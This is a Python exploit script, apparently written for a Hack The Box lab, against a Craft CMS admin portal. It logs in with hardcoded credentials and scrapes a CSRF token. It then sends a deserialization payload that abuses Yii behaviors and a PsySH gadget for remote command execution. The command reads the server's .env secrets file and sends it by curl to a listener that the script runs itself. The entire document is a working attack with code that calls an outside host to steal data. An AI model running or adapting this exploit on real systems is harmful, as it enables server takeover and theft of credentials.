import base64,http.cookiejar,json,re,threading,urllib.parse,urllib.request
from http.server import BaseHTTPRequestHandler,HTTPServer
B="http://portal.international.htb";L="10.13.37.182";P=9998
class S(BaseHTTPRequestHandler):
    def do_GET(s):
        d=urllib.parse.urlparse(s.path).path[1:]
        print(base64.b64decode(d+"="*(-len(d)%4)).decode(errors="replace"),flush=True)
        s.send_response(200);s.end_headers()
    do_POST=do_GET
    def log_message(s,*a):pass
threading.Thread(target=lambda:HTTPServer(("0.0.0.0",P),S).serve_forever(),daemon=True).start()
o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
t=re.search(r'CRAFT_CSRF_TOKEN" value="([^"]+)"',o.open(B+"/admin/login").read().decode()).group(1)
o.open(urllib.request.Request(B+"/admin/actions/users/login",urllib.parse.urlencode({"loginName":"jenny","password":"Fl1ghtDeck2026!","CRAFT_CSRF_TOKEN":t}).encode()))
e="craft\\elements\\Category";k="craft\\elements\\conditions\\ElementCondition"
c="curl -s http://%s:%d/$(%s|base64 -w0)"%(L,P,"cat /var/www/portal/.env")
b={"as rce":{"__class":"yii\\behaviors\\AttributeTypecastBehavior","__construct()":[{"attributeTypes":{"typecastAfterValidate":["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"]},"typecastAfterValidate":["sh","-c",c]}]},"on *":"self::beforeSave"}
p=json.dumps({"elementType":e,"siteId":1,"search":"","condition":{"class":k,"elementType":e,"fieldLayouts":[b]}}).encode()
print(o.open(urllib.request.Request(B+"/admin/actions/element-search/search",data=p,headers={"Content-Type":"application/json","X-CSRF-Token":t})).status,flush=True)
threading.Event().wait()
